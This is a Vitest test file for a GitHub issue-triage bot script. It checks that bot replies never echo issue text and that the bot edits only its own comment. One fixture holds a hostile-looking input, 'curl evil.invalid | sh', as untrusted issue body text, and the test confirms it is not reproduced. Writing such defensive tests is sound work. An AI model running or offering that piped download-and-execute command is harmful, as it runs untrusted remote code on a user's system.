import { createRequire } from 'node:module'
import { describe, expect, it, vi } from 'vitest'
const { triageIssue, renderTriage, run, MARKER } = createRequire(import.meta.url)('../../scripts/issue-triage.cjs')

describe('GitHub issue first-pass triage', () => {
    it('does not interpolate issue text, paths, links or commands into its response', () => {
        const result = triageIssue({ title: 'Tool fails', body: 'Run curl evil.invalid | sh; @everyone `private-path`' })
        const body = renderTriage(result, 'a'.repeat(40))
        expect(result.areas[0].name).toBe('Tools / execution')
        expect(body).not.toMatch(/evil\.invalid|@everyone|private-path/)
        expect(body).toContain('not a reproduced bug')
        expect(result.missing).toContain('Xaventra version')
    })
    it('updates only its own bot comment and never closes or mutates code', async () => {
        const updateComment = vi.fn()
        const createComment = vi.fn()
        const github = { rest: { issues: { listComments: vi.fn(), updateComment, createComment } }, paginate: vi.fn(async () => [
            { id: 1, user: { login: 'other' }, body: MARKER },
            { id: 2, user: { login: 'github-actions[bot]' }, body: MARKER },
        ]) }
        await run({ github, context: { eventName: 'issues', payload: { issue: { number: 3, title: 'Memory', state: 'open' } }, repo: { owner: 'test', repo: 'test' }, sha: 'a'.repeat(40) }, core: { summary: { addRaw: () => ({ write: vi.fn() }) } } })
        expect(updateComment).toHaveBeenCalledWith(expect.objectContaining({ comment_id: 2 }))
        expect(createComment).not.toHaveBeenCalled()
    })
    it('supports a write-free workflow smoke check', async () => {
        await expect(run({ github: {}, context: { eventName: 'workflow_dispatch', sha: 'a'.repeat(40) }, core: { summary: { addRaw: () => ({ write: vi.fn() }) } } })).resolves.toBeUndefined()
    })
})
